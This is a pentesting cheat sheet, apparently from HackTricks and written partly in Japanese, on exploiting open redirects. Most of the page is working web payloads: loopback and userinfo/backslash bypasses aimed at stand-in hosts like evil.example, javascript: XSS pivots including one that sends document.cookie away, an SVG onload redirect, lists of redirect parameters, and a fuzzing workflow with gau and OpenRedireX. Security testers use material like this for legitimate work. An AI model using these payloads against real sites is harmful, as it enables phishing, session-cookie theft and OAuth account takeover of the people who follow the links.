# Open Redirect

{{#include ../banners/hacktricks-training.md}}


## Open redirect

### Redirect to localhost or arbitrary domains

- アプリが “allows only internal/whitelisted hosts” のみを許可している場合、リダイレクト先のホスト表記を工夫して loopback や内部レンジに到達させてみる:
- IPv4 loopback バリエーション: 127.0.0.1, 127.1, 2130706433 (10進数), 0x7f000001 (16進数), 017700000001 (8進数)
- IPv6 loopback バリエーション: [::1], [0:0:0:0:0:0:0:1], [::ffff:127.0.0.1]
- 末尾ドットや大文字小文字: localhost., LOCALHOST, 127.0.0.1.
- loopback に解決されるワイルドカードDNS: lvh.me, sslip.io (e.g., 127.0.0.1.sslip.io), traefik.me, localtest.me。これらは “subdomains of X” のみが許可されている場合でも、ホスト解決が 127.0.0.1 を指すときに有用。
- スキームを補完したりプレフィックスのみをチェックするような単純なバリデータを回避するために、ネットワークパス参照がしばしば有効:
- //attacker.tld → スキーム相対として解釈され、現在のスキームでオフサイトに遷移する。
- Userinfo トリックは contains/startswith チェックを回避する:
- https://trusted.tld@attacker.tld/ → ブラウザは attacker.tld に遷移するが、単純な文字列チェックは trusted.tld を“見てしまう”。
- フレームワーク/ブラウザ間のバックスラッシュのパースの不一致:
- https://trusted.tld\@attacker.tld → 一部のバックエンドは “\” をパス文字として扱い検証を通すが、ブラウザはそれを “/” に正規化し、trusted.tld を userinfo と解釈してユーザーを attacker.tld に送る。これは Node/PHP の URL パーサーの不一致でも発生する。

{{#ref}}
ssrf-server-side-request-forgery/url-format-bypass.md
{{#endref}}

### Modern open-redirect to XSS pivots
```bash
#Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

#Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

# Abuse bad subdomain filter
javascript://sub.domain.com/%0Aalert(1)

#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
#This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

#Others
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
";alert(0);//
```
<details>
<summary>よりモダンな URL-based bypass payloads</summary>
```text
# Scheme-relative (current scheme is reused)
//evil.example

# Credentials (userinfo) trick
https://trusted.example@evil.example/

# Backslash confusion (server validates, browser normalizes)
https://trusted.example\@evil.example/

# Schemeless with whitespace/control chars
evil.example%00
%09//evil.example

# Prefix/suffix matching flaws
https://trusted.example.evil.example/
https://evil.example/trusted.example

# When only path is accepted, try breaking absolute URL detection
/\\evil.example
/..//evil.example
```

```
</details>

## Open Redirect uploading svg files

```html
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='http://www.example.com'"
xmlns="http://www.w3.org/2000/svg">
</svg>
</code>
```

## Common injection parameters

```
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
success=https://c1h2e1.github.io
data=https://c1h2e1.github.io
qurl=https://c1h2e1.github.io
login=https://c1h2e1.github.io
logout=https://c1h2e1.github.io
ext=https://c1h2e1.github.io
clickurl=https://c1h2e1.github.io
goto=https://c1h2e1.github.io
rit_url=https://c1h2e1.github.io
forward_url=https://c1h2e1.github.io
@https://c1h2e1.github.io
forward=https://c1h2e1.github.io
pic=https://c1h2e1.github.io
callback_url=https://c1h2e1.github.io
jump=https://c1h2e1.github.io
jump_url=https://c1h2e1.github.io
click?u=https://c1h2e1.github.io
originUrl=https://c1h2e1.github.io
origin=https://c1h2e1.github.io
Url=https://c1h2e1.github.io
desturl=https://c1h2e1.github.io
u=https://c1h2e1.github.io
page=https://c1h2e1.github.io
u1=https://c1h2e1.github.io
action=https://c1h2e1.github.io
action_url=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
sp_url=https://c1h2e1.github.io
service=https://c1h2e1.github.io
recurl=https://c1h2e1.github.io
j?url=https://c1h2e1.github.io
url=//https://c1h2e1.github.io
uri=https://c1h2e1.github.io
u=https://c1h2e1.github.io
allinurl:https://c1h2e1.github.io
q=https://c1h2e1.github.io
link=https://c1h2e1.github.io
src=https://c1h2e1.github.io
tc?src=https://c1h2e1.github.io
linkAddress=https://c1h2e1.github.io
location=https://c1h2e1.github.io
burl=https://c1h2e1.github.io
request=https://c1h2e1.github.io
backurl=https://c1h2e1.github.io
RedirectUrl=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
ReturnUrl=https://c1h2e1.github.io
```

## Code examples

#### .Net

```bash
response.redirect("~/mysafe-subdomain/login.aspx")
```

#### Java

```bash
response.redirect("http://mysafedomain.com");
```

#### PHP

```php
<?php
/* browser redirections*/
header("Location: http://mysafedomain.com");
exit;
?>
```

## Hunting and exploitation workflow (practical)

- Single URL check with curl:

```bash
curl -s -I "https://target.tld/redirect?url=//evil.example" | grep -i "^Location:"
```

- Discover and fuzz likely parameters at scale:

<details>
<summary>Click to expand</summary>

```bash
# 1) 履歴のあるURLを収集し、一般的なリダイレクトパラメータを含むものを残す
cat domains.txt \
| gau --o urls.txt            # or: waybackurls / katana / hakrawler

# 2) Grepで一般的なパラメータを抽出し、リストを正規化する
rg -NI "(url=|next=|redir=|redirect|dest=|rurl=|return=|continue=)" urls.txt \
| sed 's/\r$//' | sort -u > candidates.txt

# 3) OpenRedireXを使ってpayload corpusでfuzzする
cat candidates.txt | openredirex -p payloads.txt -k FUZZ -c 50 > results.txt

# 4) 興味深いヒットを手動で検証する
awk '/30[1237]|Location:/I' results.txt
```
```
</details>

- SPAs のクライアント側シンクを忘れない：window.location/assign/replace や query/hash を読み取ってリダイレクトするフレームワークのヘルパーを探す。

- フレームワークは、リダイレクト先が信頼できない入力（query params、Referer、cookies）から生成されると落とし穴を生むことが多い。Next.js のリダイレクトに関する注記を参照し、ユーザー入力由来の動的なリダイレクト先は避ける。

{{#ref}}
../network-services-pentesting/pentesting-web/nextjs.md
{{#endref}}

- OAuth/OIDC フロー：open redirectors を悪用すると authorization codes/tokens の leaking により account takeover に至ることが多い。専用ガイドを参照：

{{#ref}}
./oauth-to-account-takeover.md
{{#endref}}

- Location を使わない（meta refresh/JavaScript）リダイレクトを実装するサーバのレスポンスは、phishing に悪用可能で、場合によってはチェーンされ得る。Grep for:
```html
<meta http-equiv="refresh" content="0;url=//evil.example">
<script>location = new URLSearchParams(location.search).get('next')</script>
```
## ツール

- [https://github.com/0xNanda/Oralyzer](https://github.com/0xNanda/Oralyzer)
- OpenRedireX – open redirects を検出するための fuzzer。例：
```bash
# Install
git clone https://github.com/devanshbatham/OpenRedireX && cd OpenRedireX && ./setup.sh

# Fuzz a list of candidate URLs (use FUZZ as placeholder)
cat list_of_urls.txt | ./openredirex.py -p payloads.txt -k FUZZ -c 50
```
## 参考資料

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect には fuzzing リストがあります。
- [https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
- [https://github.com/cujanovic/Open-Redirect-Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)
- [https://infosecwriteups.com/open-redirects-bypassing-csrf-validations-simplified-4215dc4f180a](https://infosecwriteups.com/open-redirects-bypassing-csrf-validations-simplified-4215dc4f180a)
- PortSwigger Web Security Academy – DOM-based open redirection: https://portswigger.net/web-security/dom-based/open-redirection
- OpenRedireX – open redirect vulnerabilities を検出するための fuzzer: https://github.com/devanshbatham/OpenRedireX

{{#include ../banners/hacktricks-training.md}}
